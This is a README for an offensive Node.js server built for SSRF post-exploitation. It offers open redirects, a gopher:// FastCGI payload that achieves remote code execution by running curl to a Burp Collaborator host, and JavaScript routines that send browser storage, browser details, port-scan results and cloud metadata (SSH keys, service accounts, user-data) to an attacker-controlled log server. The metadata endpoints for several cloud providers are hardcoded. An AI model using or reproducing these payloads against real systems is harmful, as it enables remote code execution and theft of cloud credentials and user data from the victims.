# js-ssrf
Server prepared for SSRF post exploitation, javascript exploits, tools and open redirect.

*AFTER SSRF*

# Installation

```
npm install express
```

# How To Run

```
node server.js
```

## Available Exploits And Tools
* Browser Storage Leak
* Chrome Headless Debug Enabled
* Leak Browser Information (Plugins, versions, etc ...)
* Cloud Metadata Information
* Local Port Scanner
* Open redirect

# How To Use

## Open Redirect
Any request that starts with **/openredirect** will redirect to the passed URL in the **url** parameter with the given scheme and parameters. You can abuse of the **gopher://** scheme to get remote code execution.

**Redirect to Google Example:** http://127.0.0.1:2222/openredirect?url=https://www.google.com

**Exploit Fastcgi RCE example:** http://127.0.0.1:2222/openredirect?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH108%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00l%04%00%3C%3Fphp%20system%28%27curl%20dm3lxhjmrekd2fwnsns1r1iin9t0hp.burpcollaborator.net%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

## Browser Storage Leak, Chrome Headless Debug Enabled, Leak Browser Information (Plugins, versions, etc ...), Cloud Metadata Information and Local Port Scanner

You need to edit the HTML page located at htmls/js-exploits.html (every request to the root page will trigger this HTML). 

#### Inportant: 
Edit the value of **collaboratorServer**  to your burp collaborator or log server, because this is how the server will retrieve the sensitive information.

```
//Collaborator server to receive info
var collaboratorServer = "ysu632p7xzqy8028y8ymxmo3tuzkn9.burpcollaborator.net";
```

If you don't have a log or burp collaborator server, this server has one in the **/log** path:

**Example:** http://127.0.0.1:2222/log?msg=LOGTHIS

**Server Log Output**:

```
Connection received: ::ffff:127.0.0.1
/log?msg=LOGTHIS
```

To use this server log you just need to edit the value of **collaboratorServer** to your IP address and port:

**Example (External IP):** 

```
//Collaborator server to receive info
var collaboratorServer = "208.12.33.44:2222";
```

#### JS Exploits and Tools
Uncomment the following lines that call the respective exploit function that you want:

```
//Browser Storage Leak
//localStorageLeak();

//Try to fetch Chrome Headless debug port
//chromeHeadless();

//Get browser information (Plugins, versions, etc ...)
//getBrowserInfo();

//GET Cloud metadata information
//cloudMetadata(googleMetadataServer, googleMetadataPaths, googleHeaders);

//Local port scanner
//portScanner("127.0.0.1", communPorts);
```

To help you, I already hardcoded some metadata servers and their paths to leak the desired information:

```
//Google Cloud
var googleMetadataServer = "metadata.google.internal";
var googleMetadataPaths = {"SSH-Keys: ": "/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json", "Service Accounts: ": "/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json", "Hostname: ": "/computeMetadata/v1/instance/hostname"}
var googleHeaders = {"X-Google-Metadata-Request": "true"}

//Alibaba Cloud
var alibabaMetadataServer = "100.100.100.200";
var alibabaMetadataPaths = {"SSH-Keys: ":"/latest/meta-data/public-keys/0/openssh-key", "Hostname: ": "/latest/meta-data/hostname", "User-Data: ": "/latest/user-data"};

//Amazon AWS & D.O
var othersMetadataServers = "169.254.169.254";

//Amazon
var amazonMetadataPaths = {"SSH-Keys: ": "/latest/meta-data/public-keys/0/openssh-key", "Hostname: ": "/latest/meta-data/public-hostname", "AMI-ID: ": "/latest/meta-data/ami-id"};

//Digital Ocean
var digitalOceanPaths = {"User-data": "/metadata/v1/user-data", "Hostname: ": "/metadata/v1/hostname", "SSH-Keys: ": "/metadata/v1/public-keys"}

//Local port scanner | Commun ports
var communPorts = [80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 28017]
```
